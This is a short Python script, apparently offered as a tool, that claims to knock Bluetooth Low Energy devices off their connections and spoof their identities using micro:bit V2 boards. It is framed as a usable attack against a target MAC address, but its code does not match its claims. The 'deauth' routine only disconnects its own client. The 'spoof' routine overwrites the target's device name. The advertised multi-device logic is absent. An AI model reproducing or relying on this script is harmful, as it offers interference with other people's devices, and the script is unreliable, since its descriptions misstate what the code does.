# microbit_ble_deauth_spoof.py

"""
BLE Deauthentication + Spoofing for micro:bit V2 (Multi-Device Support)

This script performs BLE deauthentication attacks and identity spoofing.
- Detects available micro:bit devices and assigns tasks dynamically
- Kicks BLE devices off connections (`--deauth <target_mac>`)
- Spoofs real BLE devices (`--spoof <mac> <name>`)
- Runs all tasks sequentially if only one device is available

### Usage Examples:

1. Deauthenticate a specific BLE device:
   ```sh
   python microbit_ble_deauth_spoof.py --deauth AA:BB:CC:DD:EE:FF
   ```

2. Spoof a BLE device identity:
   ```sh
   python microbit_ble_deauth_spoof.py --spoof AA:BB:CC:DD:EE:FF fake_device
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse

# Detect Connected Micro:bit Devices
async def detect_microbits():
    """Scans for connected micro:bit devices and returns their count."""
    devices = await BleakScanner.discover()
    microbits = [device.address for device in devices if "micro:bit" in (device.name or "").lower()]
    print(f"[+] Detected {len(microbits)} micro:bit devices.")
    return microbits

# BLE Deauthentication Attack
async def ble_deauth(target_mac):
    """Disconnects a target BLE device by sending deauth signals."""
    print(f"[+] Sending BLE deauth signal to {target_mac}...")
    async with BleakClient(target_mac) as client:
        await client.disconnect()
        print(f"[+] {target_mac} disconnected successfully.")

# BLE Spoofing Attack
async def ble_spoof(target_mac, spoof_name):
    """Spoofs the identity of a BLE device to impersonate it."""
    print(f"[+] Spoofing BLE identity: {target_mac} -> {spoof_name}...")
    async with BleakClient(target_mac) as client:
        await client.write_gatt_char("00002a00-0000-1000-8000-00805f9b34fb", spoof_name.encode())
        print(f"[+] Identity spoofed: {target_mac} now appears as {spoof_name}.")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Deauthentication + Spoofing for micro:bit V2")
    parser.add_argument("--deauth", help="Deauthenticate a target BLE device", metavar="target_mac")
    parser.add_argument("--spoof", nargs=2, metavar=("target_mac", "spoof_name"), help="Spoof a BLE device identity")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    microbits = loop.run_until_complete(detect_microbits())
    num_microbits = len(microbits)
    
    if args.deauth:
        loop.run_until_complete(ble_deauth(args.deauth))
    elif args.spoof:
        loop.run_until_complete(ble_spoof(args.spoof[0], args.spoof[1]))
